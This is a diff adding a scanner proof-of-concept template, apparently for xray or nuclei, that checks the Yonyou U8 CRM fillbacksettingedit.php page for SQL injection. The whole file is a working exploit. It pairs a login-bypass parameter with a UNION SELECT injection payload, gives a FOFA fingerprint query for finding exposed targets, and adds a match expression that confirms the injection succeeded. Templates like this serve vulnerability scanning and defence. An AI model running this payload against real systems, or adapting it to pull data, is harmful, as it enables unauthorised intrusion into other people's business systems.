@@ -1,0 +1,18 @@
+id: poc-yaml-yongyou-u8-crm-fillbacksettingedit
+info:
+  name: 用友U8-CRM系统fillbacksetting.php存在SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8+CRM
+  fofa: title="用友U8CRM"
+variables:
+  t1: random_int(111,456)
+requests:
+- method: GET
+  path: /config/fillbacksettingedit.php?DontCheckLogin=1&action=edit&id=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,POWER({{.t1}},3),NULL,NULL--+
+  headers:
+    Cookie: PHPSESSID=bgsesstimeout-;
+  expression: "status_code == 200 && \ncontains(body,\"\\\"src_fld\\\":\") &&\ncontains(body,\"\
+    \\\"businesInfo\\\"\") &&\ncontains(body,t1)\n"
+transport: http
